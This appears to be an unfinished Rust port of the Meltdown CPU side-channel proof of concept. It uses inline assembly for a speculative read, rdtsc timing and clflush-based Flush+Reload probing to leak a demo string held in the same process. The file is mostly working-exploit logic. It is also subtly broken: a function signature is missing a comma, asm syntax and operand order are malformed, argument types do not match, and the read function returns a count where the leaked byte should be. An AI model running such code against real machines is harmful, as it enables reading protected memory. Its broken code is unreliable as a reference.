#![no_std]

extern crate alloc;

#[allow(unused_imports)]
use runtime::*;
use terminal::{print, println};

use core::arch::asm;

// Taken from https://users.rust-lang.org/t/allocate-mut-f32-on-multiple-of-4kb/58309
#[repr(align(4096))] // TODO is this necessary?
#[derive(Copy, Clone)] // Required to initialize an entire array with such objects
#[allow(dead_code)]
pub struct MemoryPage([u128; 256]);

pub struct Config {
	measurements: u32,
	accept_after: u32,
	retries: u32,
}

pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u128) {
    unsafe {
        asm!(
            "mov {tmp} [{x}]",
            "shl 12, {tmp}",
            "mov {tmp2} [{base}+{tmp}]",
            x = in(reg) pointer,
            base = in(reg) &mem[0] as *const MemoryPage,
            tmp = out(reg) _,
            tmp2 = out(reg) _,
        );
    }
}

pub fn rdtsc() -> u64 {
    let high: u32;
    let low: u32;
    unsafe {
        asm!(
            "rdtsc",
            out("eax") low,
            out("edx") high
        );
    }
    ((high as u64) << 32) | (low as u64)
}

pub fn maccess(pointer: *const MemoryPage) {
    unsafe {
        asm!(
            "mov {tmp}, [{x}]",
            x = in(reg) pointer,
            tmp = out(reg) _,
        );
    }
}

pub fn flush(pointer: *const MemoryPage) {
    unsafe {
        asm!(
            "clflush [{x}]",
            x = in(reg) pointer,
        );
    }
}

pub fn flush_reload(cache_miss_threshold: u64, pointer: *const MemoryPage) -> bool {
    let start_time: u64;
    let end_time: u64;
    
    start_time = rdtsc();
    maccess(pointer);
    end_time = rdtsc();
    
    flush(pointer); // The entry is probably cached now no matter whether it was cached before, flush it so we don't expell the entry we are looking for from the cache by caching all other entries
    
    end_time - start_time < cache_miss_threshold
}

pub fn libkdump_read_signal_handler(config: Config cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u128) -> usize {
	for _ in 0..config.retries {
		// TODO: Set segmentation fault callback position
		meltdown_fast(mem, pointer);
			
		for i in 0..mem.len() {
			if flush_reload(cache_miss_threshold, &mem[i] as *const MemoryPage) {
				if i >= 1 { // TODO why ignore first entry?
					return i;
				}
			}
			// TODO: original has sched_yield(); here
		}
		// TODO: original has sched_yield(); here
	}
	
	return 0;
}

pub fn libkdump_read(config: Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u128) -> u32 {
	const ARRAY_SIZE: usize = 256;
	let mut res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
	
	// TODO: original has sched_yield(); here
	
	for _ in 0..config.measurements {
		// TODO: Add implementation using TSX?
		let r = libkdump_read_signal_handler(config, cache_miss_threshold, mem, pointer);
		res_stat[r] += 1;
	}
	
	let max_i = *res_stat.iter().max().expect("Couldn't find maximum!");
	if max_i > config.accept_after {
		max_i
	} else {
		0
	}
}

pub fn detect_flush_reload_threshold() -> u64{
    let mut reload_time: u64 = 0;
    let mut flush_reload_time: u64 = 0;
    let count: u64 = 10000000;
    let dummy = MemoryPage([0; 256]); // TODO Use single value instead of array ok?
    let pointer: *const MemoryPage;
    let mut start_time: u64;
    let mut end_time: u64;
    
    pointer = &dummy;
    
    maccess(pointer);
    for _ in 0..count {
        start_time = rdtsc();
        maccess(pointer);
        end_time = rdtsc();
        reload_time += end_time - start_time;
    }
    
    for _ in 0..count {
        start_time = rdtsc();
        maccess(pointer);
        end_time = rdtsc();
        flush(pointer);
        flush_reload_time += end_time - start_time;
    }
    
    println!("Total time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
    reload_time /= count;
    flush_reload_time /= count;
    println!("Average time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
    let threshold = (flush_reload_time + reload_time * 2) / 3;
    println!("Threshold: {}", threshold);
    return threshold;
}

#[unsafe(no_mangle)]
pub fn main() {
    println!("Meltdown start\n");
    const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K
    const SECRET: &str = "Whoever reads this is dumb.";
    let default_config = Config {
		measurements: 3,
		accept_after: 1,
		retries: 10000,
	};
    
    println!("Current CPU time: {}", rdtsc());
    let cache_miss_threshold = detect_flush_reload_threshold();
    
    let mem: [MemoryPage; ARRAY_SIZE] = [MemoryPage([0; 256]); ARRAY_SIZE];
    
    for i in 0..ARRAY_SIZE {
        flush(&mem[i] as *const MemoryPage);
    }
    
    let mut index: usize = 0;
    while index < SECRET.len() {
		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, &SECRET[index..index] as *const str);
		println!("Got value: {}", value);
		index += 1;
	}
}
